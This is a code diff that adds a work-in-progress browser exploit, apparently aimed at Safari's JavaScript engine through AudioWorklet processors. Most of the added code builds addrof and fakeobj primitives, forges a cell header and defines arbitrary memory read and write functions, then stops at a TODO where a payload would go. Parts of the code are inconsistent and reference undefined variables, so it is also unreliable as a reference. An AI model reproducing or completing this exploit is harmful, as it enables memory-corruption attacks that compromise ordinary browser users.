@@ -121,7 +121,283 @@
         function sleep(ms) {
             return new Promise(resolve => setTimeout(resolve, ms));
         }
-        async function main(){
+	var AudioContext = window.AudioContext || window.webkitAudioContext;
+	var OfflineAudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+	var context = new OfflineAudioContext(1, 128, 300000);
+        context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+          // constant added to double JSValues
+          const kBoxedDoubleOffset = 0x0002000000000000n;
+          function boxDouble(d) {
+            return d + kBoxedDoubleOffset;
+          }
+          function unboxDouble(d) {
+            return d - kBoxedDoubleOffset;
+          }
+          // the structure ID is wrong, but we'll fix it :)
+          let doubleArrayCellHeader = 0x0108230700000000n;
+          let f = new Float64Array(1);
+          let u = new Uint32Array(f.buffer);
+          function float2bigint(v) {
+            f[0] = v;
+            return BigInt(u[0]) | (BigInt(u[1]) << 32n);
+          }
+          function bigint2float(v) {
+            u[0] = Number(v & 0xffffffffn);
+            u[1] = Number(v >> 32n);
+            return f[0];
+          }
+	   floatAsQword = float => {
+            data_view.setFloat64(0, float, true);
+            var low = data_view.getUint32(0, true);
+            var high = data_view.getUint32(4, true);
+            return low + high * 0x100000000;
+           }
+	   var qwordAsTagged = qword =>{
+    		return qwordAsFloat( qword- 0x02000000000000);
+		}
+
+           qwordAsFloat = qword => {
+            data_view.setUint32(0, qword%0x100000000, true);
+            data_view.setUint32(4, qword/0x100000000, true);
+            //data_view.setBigUint64(0, qword);
+            return data_view.getFloat64(0);
+           }
+          // store things to prevent GC
+          let keep = [];
+          function gc(n=10000) {
+            let tmp = [];
+            for (var i = 0; i < n; i++) tmp.push(new Uint8Array(10000));
+          }
+
+          // message port to talk to main thread; will be set later
+          let port = null;
+
+          // will be implemented later
+          let fakeobj = null;
+          let addrof = null;
+
+          for (var i = 0; i < 100; i++) keep.push([1.1*i]);
+          let a0 = [13.37,13.37] //[0,0,0,0,0,0,0,0,0,0];
+	  a0.prop = 13.37
+	  a0["p" + 1] = 13.37
+          let a1 = [0,0,0,0,0,0,0,0,0,0];
+          // transition to unboxed double storage
+          a1[3] = 13.37;
+          let b0 = [0,0,0,0,0,0,0,0,0,0];
+          let b1 = [0,0,a1,a1,0,0,0,0,0,0]; // store references to a1 to make b1 a boxed array
+
+          // put zeroes in first two slots so JSCallbackData destruction is safe
+          delete b1[0];
+          delete b1[1];
+
+          function setupPrimitives() {
+            port.postMessage("setting up");
+            if (a1.length != 0x1337) {
+              port.postMessage("Failure on array length");
+              return;
+            }
+
+            const kSentinel = 1333.337;
+            let offset = -1;
+
+            b1[0] = kSentinel;
+            // scan for the sentinel to find the offset from a to b
+            for (var i = 0; i < 0x100; i++) {
+              if (bigint2float(unboxDouble(float2bigint(a1[i]))) == kSentinel) {
+                offset = i;
+                break;
+              }
+            }
+            if (offset == -1) {
+              port.postMessage("Failure finding offset");
+              return;
+            }
+
+            // temporary implementations
+            addrof = (val) => {
+              b1[0] = val;
+              return floatAsQword(a1[offset]);
+            }
+            fakeobj = (addr) => {
+              a1[offset] = qwordAsFloat(addr);
+              return b1[0];
+            }
+
+            let obj = {
+              jsCellHeader: qwordAsTagged(0x0108230900000000),
+              fakeButterfly: a0
+            };
+	    victim1 = a0;
+            let addr = addrof(obj);
+            port.postMessage("obj @ " + addr.toString(16));
+
+            let fakeArr = fakeobj(addr + 0x10);
+	    var jscell_header = fakeArr[0];
+	    obj.jsCellHeader = jscellHeader;
+	    let results = [];
+    for (let i = 0; i < 2; i++) { //trigger jit by performing same operation more than once
+        let a = i == 0 ? hax : victim1; //perform logical get_by_val operation twice of 
+	    //essentially in first loop itll grab our hax object because i will equal 0 so itll get hax object
+	    //but the second time it will grab victim1 object essentially clearing the JITCache
+        results.push(a[0]); //push the results to results array
+    }
+    var jscell_header = results[0]; //make jscell_header equal that of victim1
+    port.postMessage("Stolen Real Cell Header: " + qwordAsFloat(jscell_header));
+    var stage2 = {
+        addrof: function(obj) {
+            return addrof(obj)
+        },
+
+        fakeobj: function(addr) {
+            return fakeobj(addr)
+        },
+
+        write64: function(where, what) {
+            hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = qwordAsFloat(what);
+        },
+	
+	writeInt64: function(where, what) {
+            //set_victim_addr(where)
+	    hax[1] = qwordAsFloat(where + 0x10);
+            victim1.prop = what.asDouble();
+        },
+
+
+        read64: function(where) {
+            hax[1] = qwordAsFloat(where + 0x10);
+            var res = floatAsQword(victim1.prop);
+            //hax[1] = reset;
+            //victim1.prop = shared_butterfly;
+            return res;
+        },
+        readInt64: function(where) {
+            if (where instanceof Int64) {
+                where = Add(where, 0x10);
+		hax[1] = where.asDouble();
+	    } else {
+		hax[1] = qwordAsFloat(where + 0x10);
+	    }
+            //hax[1] = qwordAsFloat(where + 0x10); //(Add(where , new Int64("0x10"))).asDouble();
+            var res = floatAsQword(victim1.prop) //is this a double? //this.addrof(victim1.prop);
+            //hax[1] = reset;
+            //victim1.prop = shared_butterfly;
+            return new Int64(res);
+        },
+        write(addr, data) {
+            while (data.length % 4 != 0)
+                data.push(0);
+
+            var bytes = new Uint8Array(data);
+            var ints = new Uint16Array(bytes.buffer);
+
+            for (var i = 0; i < ints.length; i++)
+                this.write64(Add(addr, 2 * i), ints[i]);
+        },
+        read(addr, length) {
+	    //addr = new Int64(addr);
+            var a = new Array(length);
+            var i;
+            var v;
+
+            for (i = 0; i + 8 < length; i += 8) {
+                v = new Int64(this.read64(addr + i)).bytes()
+                for (var j = 0; j < 8; j++) {
+                    a[i+j] = v[j];
+                }
+            }
+
+            v = new Int64(this.read64(addr + i)).bytes()
+            for (var j = i; j < length; j++) {
+                a[j] = v[j - i];
+            }
+
+            return a
+
+        },
+
+        test: function() {
+            var addr = this.addrof({a: 0x1337});
+            var x = this.fakeobj(addr);
+            port.postMessage(hex1(x.a))
+            if (hex1(x.a) != 0x1337) {
+                print('stage2 addrof/fakeobj does not work');
+            }
+
+            var val = 0x42424242;
+            //this.write64(0x4141414141,0x999999999)
+            //this.read64(0x999999)
+            this.write64(shared_butterfly - 8, 0x42424242);
+            print(hex1(floatAsQword(unboxed1[1])))
+            if (qwordAsFloat(val) != unboxed1[1]) {
+                print('stage2 write does not work');
+            }
+
+            if (this.read64(shared_butterfly + 8) != 0x42424242) {
+                print('stage2 read does not work');
+            }
+        },
+
+        clear: function() {
+            outer = null;
+            hax = null;
+            for (var i = 0; i < unboxed_size; ++i)
+                boxed1[i] = null;
+            boxed1 = null
+            unboxed1 = null
+        },
+    };
+    port.postMessage("We have arbitrary r/w :)");
+    
+	    
+          }
+
+          function pwn() {
+            try {
+              setupPrimitives();
+
+              // ensure we can survive GC
+              gc();
+
+              // TODO: rest of exploit goes here
+
+              port.postMessage("done!");
+            } catch(e) { // send exception strings to main thread (for debugging)
+              port.postMessage("Exception!!");
+              port.postMessage(e.toString());
+            }
+          }
+
+          registerProcessor("a", class {
+            constructor() {
+              // setup a message port to the main thread
+              port = new AudioWorkletProcessor().port;
+              port.onmessage = pwn;
+
+              // this part is magic
+              // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
+              eval('1 + 0x1336');
+
+              // overwrite a1's butterfly with a fastMalloc pointer
+              return {fill: 1, a: a0};
+            }
+          });
+          registerProcessor("b", class {
+            constructor() {
+              // overwrite b1's butterfly with a fastMalloc pointer
+              return {fill: 1, b: b0};
+            }
+          });
+        `], {type: "text/javascript"}))).then(async () => {
+          var wa = new AudioWorkletNode(context, "a");
+          var wb = new AudioWorkletNode(context, "b");
+          wa.port.onmessage = (e) => { log(e.data); console.log(e.data) }
+          await (new Promise((res) => setTimeout(res, 100)));
+          wa.port.postMessage("pwn");
+        });
+      }
+						
+        /*async function main(){
             log("Who does pwn my safari?");
 		var AudioContext = window.AudioContext || window.webkitAudioContext;
 		var OfflineAudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
@@ -181,11 +457,11 @@
 	    
             //
             originNode.connect(audioCtx.destination);
-            /*
+            
             inputBufferSrc.connect(originNode)
             .connect(outputBufferSrc)
             .connect(audioCtx.destination);
-            */
+            
             //originNode2.connect(audioCtx.destination);
             await audioCtx.startRendering();
             //alert("fuck");
@@ -193,7 +469,7 @@
         }
         //alert();
         //alert(window.OfflineAudioContext);
-        main();
+        main();*/
 					}
 	}
 					start();
